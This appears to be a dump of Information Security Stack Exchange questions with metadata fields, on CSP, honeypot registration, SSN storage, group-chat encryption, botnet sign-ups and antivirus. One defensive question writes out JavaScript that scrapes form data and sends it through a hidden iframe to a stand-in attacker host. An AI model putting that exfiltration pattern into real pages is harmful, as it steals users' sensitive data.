<p>In the case an attacker has an email address and uses it to attempt to find out whether or not there is an associated user account by attempting a registration. My question is as follows: Suppose you used a hybrid of intrusion attempt detection and a honey pot. So - you have a registration attempt that throws some red-flags in that it is not from a usual IP for that user, not from the usual geographical area for that user, and the client fingerprint is different. Obviously, in the case that a user already has an account, they're most likely not going to attempt to register again.</p>

<p>In the situation where all or most of these red flags are present, why not just allow the intruder to continue with the registration process, all the way to the completion of the account and full setup. Yes, this causes some issues with figuring out how exactly you're going to have 2 accounts with the same username (possibly dictated simply by username/salted_pw as the key difference). But in this manner - the attacker would most likely give up. You could then inform the original user, inform them and get their verification, and keep the honeypot account indefinitely until either A) the time dictated by the site before the account is closed due to non-use has passed or B) the attacker continues to attempt creating honey pots in hopes of finally landing on the real account. In this case, you could simply say - after 3 false accounts, that user is then banned for site abuse (but the real account is kept open for the user - informing the user of the issue - suggesting some actions to better secure the account and putting the account under close watch). Password reset would follow a similar honeypot-like path.</p>

<p>In this case - can anybody see any major issues or problems with implementing something like this? I mean - from a security standpoint - would this actually be a feasible method of deterring such attacks while keeping the user's anonymity?</p>
","36008","","36008","","2019-02-10 23:06:29","2019-02-18 03:24:03","Concerning The OWASP Security Guidelines As They Apply To Site Registration / Could honeypotting work?","<account-security><honeypot><owasp>","1","3","","","","CC BY-SA 4.0"
"203340","1","203341","","2019-02-11 04:52:44","","4","4584","<p>I recently discovered that its possible to run javascript from an <code>&lt;a&gt;</code> tag like this</p>

<p><code>&lt;a href=""javascript:alert('test')""&gt;</code></p>

<p>and this gets run on the current page when clicked. It also seems to run in the context of the page it was clicked on and has access to the websites local storage. I want to prevent this from happening. I can see CSP can be used to block inline javascript blocks but I can't see if this includes these javascript links.</p>

<p>Would adding a CSP header prevent these JS links from working?</p>
","37960","","","","","2019-02-11 06:17:01","Does CSP block javascript in <a href> tags?","<javascript><html><content-security-policy>","1","0","","","","CC BY-SA 4.0"
"203387","1","","","2019-02-11 20:07:05","","0","635","<p>After scouring the web to find countless similar questions, I still find it important enough to ask based on my client's specific requirements. Now I know most if not all are not a lawyer, but if you've had experience in this field, please share.</p>

<ol>
<li>Environment - ASP.net c#, SQL Server</li>
<li>It's my server on AWS, with multiple client sites on it.</li>
<li>Site is protected with SSL certificate</li>
</ol>

<p>My client has requested that I create an onboarding process for their hiring managers, that of which is accessed via private website (username, password) and controlled by security roles as to who can access these specific pages.</p>

<p>This onboarding process can take as little as a day, and as long as a month. They need to store the employee's social security number and other personal identification information during this time, in their website's database. The flow works like this:</p>

<ol>
<li>Manager role fills out an initial hire request with basic information</li>
<li>When approved, manager is notified and completes the rest of the documentation (including SSN)</li>
<li>Then another manager is notified and goes through the process of background checks and various other enrollments that all require the SSN.</li>
</ol>

<p>Aside from me being paranoid about any legal requirements of this, the following is what I'm thinking:</p>

<ol>
<li>I store a symmetric key in <code>web.config</code></li>
<li>Also, instead of storing this key broken up in a few places, take a hybrid approach and when initially encrypting, use the key in <code>web.config</code> and a few other items (i.e. created date, guid, last name) to encrypt. I was thinking of this approach (<a href=""https://www.aspsnippets.com/Articles/AES-Encryption-Decryption-Cryptography-Tutorial-with-example-in-ASPNet-using-C-and-VBNet.aspx"" rel=""nofollow noreferrer"">https://www.aspsnippets.com/Articles/AES-Encryption-Decryption-Cryptography-Tutorial-with-example-in-ASPNet-using-C-and-VBNet.aspx</a>)</li>
<li>When client loads the detail view to access this information, in order to see this SSN they enter in one of those partials that I previously mentioned, like <code>created</code> in the form of <strong>mmddyyyyhhmm</strong> and then that pieces the key back together: <code>web.config key</code> + <code>mmddyyyyhhmm user input</code> + <code>guid</code></li>
</ol>

<p>So I'm trying to eliminate the possibility of access to this information if a manager's user account on the website was breached. An attacker would have no immediate notion that the created date needs to be entered. At this point it seems the remaining danger is if someone somehow gets access to the sever itself and decompiles the assembly to see how the unique encryption key for each employee is being generated in order to decrypt what's in the database.</p>

<p>Then when the process is complete for that employee the associated record in the database would be removed.</p>

<p>Is there anything blatantly wrong with this approach?</p>
","61349","","","","","2019-02-11 20:07:05","How to store SSN in asp.net web-based application on a short-term basis?","<.net><asp.net><sql-server><identity-theft><social-security-number>","0","5","","","","CC BY-SA 4.0"
"203398","1","","","2019-02-12 06:37:34","","1","425","<p>For example I am having an iframe with src <code>https://iframe1.com</code> which is listed in my content security policy. If the whitelisted iframe calls some iframe from another source like <code>https://iframe2.com</code>, will the content security policy block the iframe?</p>

<p>For example I am having an iframe with src <code>https://iframe1.com</code> which is listed in my content security policy. If the whitelisted iframe calls some script from another source like <code>https://thirdparty/script.js</code>, will the content security policy block the script?</p>

<p>If it is going to block it, how do I whitelist the script and iframe?</p>

<p>I know 'strict-dynamic' whitelists scripts if it is generated from whitelisted root script. Does it whitelist the script if it is generate from whitelisted frame source also?</p>
","199357","","199357","","2019-02-12 12:53:44","2019-02-13 06:57:59","How to whitelist an iframe and script of some other source embeded/ called by an iframe that is whitelisted in the CSP?","<content-security-policy><iframe>","0","0","0","","","CC BY-SA 4.0"
"203466","1","","","2019-02-12 22:26:37","","3","190","<p>My internet provider doesn't let me open my ports, it's an optional service, and even when they finally said over the phone that I was allowed to open the ports  I was still not able to. So I was annoyed with this and decided to set up the raspberry in DMZ to test whether the VPN server I was setting up was configured right or if it was just a port problem. When I figured out that it was just a port problem I fell asleep, the next day I woke up with my username and password changed. Now I'd really like to know whether I was hacked and if so if it is possible backtrack who hacked me. 
I'm not sure how to do this. I really want to do it just for the sake of it and to gain some experience in this field, not sure if this is dangerous. Of course I changed the SD card of the Raspberry Pi. </p>
","199443","","","","","2019-02-12 22:26:37","Hacked Raspberry-pi server","<vpn><ip><account-security><raspberry-pi>","0","1","","","","CC BY-SA 4.0"
"203907","1","","","2019-02-20 10:09:32","","1","67","<p><strong>The environment</strong></p>

<p>Our company has a reasonable (from the point of view of a regular employee) security policy consisting of, among other things:</p>

<ul>
<li>Sophos suite covering both local antivirus solution and Internet access screening (corporate proxy with a MITM proxy for https),</li>
<li>Windows 10 with disk encryption, </li>
<li>automatic log out (lock) timer per domain policy,</li>
<li>central control of installed software (both installations and compliance checks of user-installed sowftware),</li>
<li>no single-sign-on, very few if any mandatory programs continuously running,</li>
<li>users can be local admins (devs and such) but can't override domain policies (like the automatic lock after preset time),</li>
<li>VPN access for field workers.</li>
</ul>

<p>In place are legal measures as well, like non-disclosure agreements signed by every employee.</p>

<p>Users have full physical access to their machines (from plugging USBs to opening the box and fiddling with stuff, though usually nobody does the latter). </p>

<p><strong>The question</strong></p>

<p>Given the situation described above, is it reasonable to assume that giving an employee a Virtual Appliance for a common virtualization environment (VMWare, VirtualBox, KVM...) is no different than giving them a laptop with same configuration to work remotely? The VM would be run either on a throw-away computer or the employee's private computer*. Am I missing something important here which would disqualify the VM run on arbitrary hardware?</p>

<p>One thing I can think of is poorly secured VM host on which a malware program (for example a keylogger) can sit between the user input and the VM, which would not be the case for a better secured physical computer (but admittedly would work with a remote desktop from said poorly secured computer). I'm interested in possible problems like this one.</p>
","87383","","","","","2019-02-20 10:15:30","Extending on-premise security to a virtual machine used in Home Office environment","<vpn><account-security><network-access-control>","1","0","","","","CC BY-SA 4.0"
"203960","1","203985","","2019-02-20 22:21:47","","2","484","<p>I make monthly payments to a website/company who insecurely stores my information. These are in the form of loan payments, so I don't know if I can change who I pay to.</p>

<p>I asked for login assistance one-day and they sent an email saying they logged into my account fine and that this was my password: example123. Additionally, my bank account is stored on the account showing all of the digits of the account rather than last 4. </p>

<p>Is there anything I can do to protect myself?  </p>
","159853","","98538","","2019-02-25 09:27:13","2019-02-25 09:27:13","What to do about company that sent my password information in plaintext?","<passwords><email><account-security>","2","6","","","","CC BY-SA 4.0"
"204295","1","204300","","2019-02-26 10:20:58","","8","3880","<p>I was thinking about building a simple end-to-end encrypted chat with group chat capabilities. Please bare in mind that 1) it's just an experiment to help me know more about cryptography and 2) I'm an humble programmer not a security expert that knows all the cyphers out there and complex encryption schemes.</p>

<p>My first thought was to:</p>

<ul>
<li><strong>Single conversations</strong> (two persons): each client generates a public/private key pair and sends the public key to the server. Every-time someone whats to talk to another person they just have to grab the recipient's public key from the server and encrypt the messages using that key. Later on the recipient can just decrypt them with their private key;</li>
<li><strong>Group Chats</strong>: when someone starts a group chat:

<ol>
<li>A public/private key pair is generated by the user who created the chat (lets call it starter);</li>
<li>The ""starter"" fetches all public keys of the participants from the server and encrypts the chat's private key with them;</li>
<li>The ""starter"" sends the encrypted chat private key to each participant;</li>
<li>Each participant can now send encrypted messages (by encrypting them with the chat's public key) and decrypt messages coming from others by using the chat's public key.</li>
<li>If someone is added or removed from the chat, a new chat public/private key pair is generated and distributed using the same procedure above.</li>
</ol></li>
</ul>

<p>Focusing on the group chats: What are the drawbacks of this implementation? Is this a reasonable and secure approach to the problem?</p>
","42737","","36782","","2019-07-21 11:12:31","2019-07-21 11:12:31","End-to-end Encrypted Group Chat Considerations","<security-by-design><end-to-end-encryption>","2","6","","","","CC BY-SA 4.0"
"204431","1","204433","","2019-02-27 21:03:32","","1","1460","<p>Example: Users want to use Sticky Notes for quick note taking. They don't like other options, they want Sticky Notes. </p>

<p>However, Sticky Notes normally stores the information in a SQL db that can be read with Notepad++ with little trouble.</p>

<p>Telling users not to store passwords on there is all well and good, but they will still do it and even if we punish them, they still put the company at risk.</p>

<p>Can you secure Sticky Notes such that they can't be simply read with an editor?</p>
","200710","","","","","2019-02-27 21:27:20","Is it at all possible to store Windows Sticky Notes in a secure manner?","<password-management><account-security>","1","6","","","","CC BY-SA 4.0"
"204508","1","","","2019-02-28 19:23:09","","2","2133","<p>Assume we have a webpage with sensitive data.  The page uses a marketing partner advertisingpartner.com which collects data via third-party cookies in a foreign iframe.  We have applied a relatively strict CSP:</p>

<pre><code>connect-src 'self';
frame-ancestors 'self';
frame-src 'self' https://advertisingpartner.com;
media-src 'self';
object-src 'none';
script-src 'self' 'unsafe-inline' https://advertisingpartner.com;
style-srce 'self' 'unsafe-inline';
</code></pre>

<p>The marketing script is then loaded via a normal script tag and injects an iframe.  Now suppose that the marketing partner is compromised, and code is added to create an instance of the tracking iframe:</p>

<pre><code>var data = scrape_sensitive_data_from_forms();
var frame = document.createElement(""iframe"");
frame.id = ""attackerframe"";
frame.style.display = ""none"";
frame.onload = function() {
  document.getElementById(""attackerframe"").contentWindow.postMessage(data, ""https://advertisingpartner.com"");
};
frame.src = ""https://advertisingpartner.com/trackingframe.html"";
document.body.appendChild(frame);
</code></pre>

<p>Their tracking frame has appropriate message-receiving capabilities added to retrieve and exfiltrate the data.  It is under a different domain than the main site and thus does not have the CSP applied to it:</p>

<pre><code>function receiveMessage(event) {
  var req = new XMLHttpRequest();
  req.open(""POST"", ""https://attackersite.com/collectsensitivedata.php"", true);
  req.send(event.data);
}

window.addEventListener(""message"", receiveMessage, false);
</code></pre>

<p>What can save me from this attack?</p>
","200790","","","","","2019-02-28 21:46:51","Content Security Policy: postMessage into foreign iframe","<javascript><content-security-policy><iframe><exfiltration>","1","0","0","","","CC BY-SA 4.0"
"204634","1","","","2019-03-03 09:45:11","","2","143","<p>I'm a full-stack web developer working in a small startup and have been wearing many hats as a result. I am by no means a cyber or information security expert. I'm looking for a general evaluation of severity and potential steps I can take as we seem to have been probed by a phishing botnet which is more advanced than what I am used to.</p>

<p>My application is a small MVP, LAMP stack and deployed on AWS a few weeks ago. It hasn't been promoted or publicized in any way. Nevertheless, I seemed to be getting scraped by various bots, and this wasn't a concern for me because in my experience this is a common occurrence once you network your deployment on a popular service like AWS.</p>

<p>Then, I noticed something more unusual in my experience, which is some spammy logins and account creation. Still, nothing too concerning because at the application level we have appropriate roles for new users and I was pretty confident this was just going to be an annoyance.</p>

<p>Finally, I started noticing similar emails popup in the list I identified as spam. Pretty soon I noticed a pattern - they were all <code>@gmail</code> and all the same accounts - except they had ""<code>.</code>"" (periods) in randomly different places. Now I know this means, according to Gmail, <em>that it goes to the same email address</em>. </p>

<p>But then I got concerned that it was going to be a phishing attack because someone could take my email and append a dot in the middle and send emails my way from their account. I thought also if they established an XSS attack they could use this to direct me more easily to the page, and I'm sure there are other things they could do.</p>

<p>A couple notes about these accounts: they weren't the kinds of bots (if it was a bot) I am used to. The different variations of the same address were small in volume, only three and spread out over several days. When I traced the IP it came back as being on a blacklist associated with the Avalanche botnet. At this point I was a bit intimidated but I couldn't find any information specifically on Avalanche and this gmail quirk. I also read that Avalanche had largely been taken down by the authorities, so was a bit concerned about this as well.</p>

<p>To pin down my question:</p>

<p>1). Given the nature of the account creation - was it a human being doing this or likely a bot? Was I targeted specifically or is this bot just hitting all AWS IPs, for example? Is the avalanche bot advanced to space out the account creation so it doesn't look like the more obvious bots and spam attacks?</p>

<p>2). I feel like another shoe has to drop here - obviously I can quickly create some application logic to get rid of treating gmails and other emails with dots as separate accounts - but that in of itself seems like their setup, not their final play. Should I be worried about other exploits on my system? I have setup proper security groups, SSH keys, SSL and have separate servers for my different services.</p>

<p>3). How worried should I be? Is this just part of life on the internet? I just have never seen this bot before and am worried this is only part 1 of a targeted attack - again we have only about 20 users in the database - most of whom are internal company accounts. So I'm worried that we are already dealing with this kind of attack at our small scale.</p>

<p>4). What can I do to mitigate this kind of phishing attack beyond sanitizing the dots things? Are there some canonical resources for these kinds of exploits? I didn't think about the dots until after I noticed the similarities in the three emails.</p>

<p><strong>EDIT:</strong> I should mention I am still going through the logs and trying to find what else this IP/user/bot was doing besides creating these accounts... but my guess is I won't find much and it is a lot to go through because of how my AWS is spacing out the logs and the fact that we were testing a load balancer for a while.</p>

<p>Thank you so much :)</p>
","200983","","200983","","2019-03-03 09:51:15","2019-03-03 09:51:15","Gmail (Dot) Phishing Attack From Avalanche Botnet","<phishing><account-security><gmail>","0","1","","","","CC BY-SA 4.0"
"65728","1","","","2014-08-19 14:36:53","","1","463","<p>Hello I am considering installing owasp mod_security crs on an ubuntu 12.04.4 which comes with apache 2.2.22. On the github page I have seen many version's but all tutorials were using <code>2.2.7</code></p>

<p>First I figured it's because the posts are using the available version at the time of writing . </p>

<p>Is there any caveat using version 3.0.0 in apache 2.2.22? Since I have used 2.2.7 before I wanted to ask some one who has gone down this path (3.0.0) before going ahead </p>

<p>Thanks in advance</p>
","21129","","21129","","2014-08-19 15:14:36","2014-08-19 15:14:36","Which OWASP modsecurity crs version to install on apache 2.2.22","<apache><owasp><mod-security>","0","2","","","","CC BY-SA 3.0"
"65803","1","","","2014-08-20 12:59:56","","1","481","<p>Symantec recently made a loud statement that antivirus is dead (<a href=""http://online.wsj.com/news/article_email/SB10001424052702303417104579542140235850578-lMyQjAxMTA0MDAwNTEwNDUyWj"" rel=""nofollow"">http://online.wsj.com/news/article_email/SB10001424052702303417104579542140235850578-lMyQjAxMTA0MDAwNTEwNDUyWj</a> ) and that they don’t really consider it to be a source of profit. Some companies said the same afterwards; some other suggested that Symantec just wants a bit of free media attention. Some companies just silently recommend using advanced information protection and press is full of data on antivirus efficiency being quite low. A notable example would be the Zeus banking Trojan and how only 40% of its versions can be stopped by antiviruses (<a href=""http://www.bankinfosecurity.eu/banking-malware-new-challenger-to-zeus-a-7006/p-2"" rel=""nofollow"">http://www.bankinfosecurity.eu/banking-malware-new-challenger-to-zeus-a-7006/p-2</a> ). Arms race of protection and malware developers is probably not going to stop, so this situation will remain.</p>

<p>On the other hand, nobody was thinking too much of antivirus anyway for a long time already, so it’s hardly surprising. It’s not a panacea; the only question that remains is just how exactly should antivirus operate in modern security solutions. Should it be one of the key parts or protection solution or it should be reduced to protection against only the easiest and already well known threats?</p>

<p>It’s not only about dealing with threats, too, there are also performance concerns. Processors get better and interaction with hard drives becomes faster but at the same time antiviruses require more and more of that power. Real time file scanning, constant updates and regular checks on the whole system only mean one thing – as long as antivirus is thorough, productivity while using this computer go down severely. And this situation is not going to change, ever, so we have to deal with it.</p>

<p>But how exactly? Is the massive migration of everything, from workstations to automatic control systems in industry, even possible? Or maybe using whitelisting protection on windows-based machines is the answer? Or we should all just sit and hope for Microsoft to give us a new windows with good integrated protection like windows 8 is stated to have? Any other ways to deal with it? </p>
","26518","","","","","2014-08-20 15:59:02","So, how dead is antivirus exactly?","<security-theater>","2","3","","2014-08-20 20:55:33","","CC BY-SA 3.0"
"65829","1","","","2014-08-20 16:21:00","","1","999","<p>I'm looking for an open source security dashboard that gives a basic overview of security warnings. Google has pointed me in a few directions but nothing promising. I need something to deal w/ selinux alerts, mod_security violations and hopefully have an api that can send/create new alerts to display (i think i might be asking too much, sadly). A few have suggested custom graphs in kibana but would be nice to hear other peoples thoughts.</p>

<p>Thanks </p>
","54140","","","","","2014-08-20 18:48:32","Open Source Security Dashboard?","<mod-security><selinux>","2","0","","2014-08-20 22:44:31","","CC BY-SA 3.0"
"66299","1","","","2014-08-28 05:45:02","","1","219","<p>I use my MasterCard credit card for online transactions which uses SecureCode for preventing online frauds even though hackers knows our credit card details.</p>

<p>I have come across many sites which is asking me to enter SecureCode.</p>

<p>But recently i made one transaction in one online website, which is just taken my card details. I was waiting for SecureCode to be entered, but it shows transaction success and I got message money deducted as well.</p>

<p>Why some sites allowed by MasterCard to not required SecureCode ?
what does it mean ? It's more prone to online fraud.. isn't it ?</p>

<p>Using Smart card readers,security tokens we don't need to enter SecureCode i read from wiki, but that article needs citation.
so anyone can clarity me on this. What's happening in transaction ?</p>
","22466","","32746","","2015-05-03 13:58:06","2015-05-03 13:58:06","Transaction without 3DS in some online websites is Fraud prone?","<defense><security-theater><fraud>","0","3","","2014-08-28 07:53:48","","CC BY-SA 3.0"
"67183","1","67238","","2014-09-11 00:56:38","","12","2002","<p>453.7 million social security numbers have been issued to date. There are only 1 billion = 1000 million distinct 9 digit integers. This means that if I were to make up any 9 digits, I would have roughly a 45% chance of guessing someone else's valid social security number.</p>

<p>With that said, is it fair to say that if a criminal has nothing but your social security number (i.e. they don't have your name, they don't know when you were born, they know nothing about you) it is in fact useless as a means to commit identity theft or other fraud?</p>
","55324","","98538","","2018-12-14 09:19:44","2018-12-14 09:27:52","Are social security numbers useless by themselves?","<fraud><identity-theft><crime><social-security-number>","2","4","","","","CC BY-SA 4.0"